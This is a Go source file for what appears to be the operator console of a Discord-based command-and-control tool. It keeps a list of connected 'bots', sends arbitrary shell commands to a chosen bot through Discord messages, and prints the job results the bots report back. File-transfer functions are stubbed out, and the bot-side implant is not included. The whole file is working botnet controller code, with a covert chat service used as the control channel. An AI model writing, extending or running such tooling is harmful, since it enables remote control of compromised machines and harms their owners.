package main

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/brnlee/DiscordGo_CC/discord"
	"github.com/bwmarrin/discordgo"
	"github.com/google/uuid"
)

type Job struct {
	id   uuid.UUID
	cmd  string
	time string
}

var bots = make(map[string]time.Time)
var jobs []Job

func main() {
	println("Attempting to create new session")
	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + discord.MasterToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)

	scanner := bufio.NewScanner(os.Stdin)
	print("> ")
	for scanner.Scan() {
		input := scanner.Text()
		if len(input) == 0 {
			print("> ")
			continue
		}
		var action string
		_, err = fmt.Sscanf(input, "%s", &action)
		switch action {
		case "jobs":
			if len(input) == len(action) {
				listJobs()
			}
		case "bots":
			fmt.Println("Listing Clients")
			if len(input) == len(action) {
				listClients()
			}
		case "shell":
			var target string
			var command string
			n, err := fmt.Sscanf(input, "shell %s %q", &target, &command)
			if err != nil {
				fmt.Printf("%s\n> ", err.Error())
				continue
			} else if n != 2 {
				print("Incorrect \"shell\" arguments\n> ")
				continue
			}
			executeShellCommand(target, command, dg)
			addJobToQueue(input)
		case "sendf":
			fmt.Println("Sending file")
		case "savef":
			fmt.Println("Downloading file")
		default:
			fmt.Printf("%s is not a valid command.\n> ", input)
			continue
		}
		print("> ")
	}

	fmt.Println("Closing")
	// Cleanly close down the Discord session.
	e := dg.Close()
	if e != nil {
		println("There was an error closing the Discord session connection.")
	}
	fmt.Println("Closed")
}

func listJobs() {
	println("Recently Executed Jobs:")
	for _, job := range jobs {
		fmt.Printf("JobID: %s\tTimestamp: %s\tCommand: %s\n", job.id, job.time, job.cmd)
	}
}
func listClients() {
	timeout := (discord.Timeout * time.Second).Seconds()
	fmt.Printf("================================================================\n" +
		"Bot ID\t\t\t\t\tTime since last ping(s)\n" +
		"================================================================\n")
	for botID, timestamp := range bots {
		timeSinceLastPing := time.Now().Sub(timestamp).Seconds()
		if timeSinceLastPing > timeout {
			delete(bots, botID)
			continue
		}
		fmt.Printf("%s\t%f s\n", botID, timeSinceLastPing)
	}
}

func executeShellCommand(target string, command string, dg *discordgo.Session) {
	message := fmt.Sprintf("%s\n%s\n%q", target, "shell", command)
	discord.SendMessage(dg, message)
}

func sendFile(target string, filename string) {

}

func downloadFile(filename string) {

}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the autenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}
	var (
		botID    string
		job      string
		response string
	)
	n, err := fmt.Sscanf(m.Content, "%s\n%q\n%q", &botID, &job, &response)
	if err != nil {
		println(err.Error())
		return
	} else if n < 2 {
		println("Poorly formatted message received")
		return
	}
	if job == "Connected" {
		if _, ok := bots[botID]; ok == false {
			fmt.Printf("New connection from %s\n", botID)
		}
		bots[botID] = time.Now()
	} else {
		str := fmt.Sprintf("Job Response:\n\tJob: %s\n\tBotID: %s\n\tResponse: %s", job, botID, response)
		println(str)
	}
}

func addJobToQueue(command string) {
	job := Job{id: uuid.New(), cmd: command, time: time.Now().Format("Jan 02 15:04:05")}
	if len(jobs) == 5 {
		jobs[0] = Job{}
		jobs = append(jobs[1:], job)
	} else {
		jobs = append(jobs, job)
	}
}
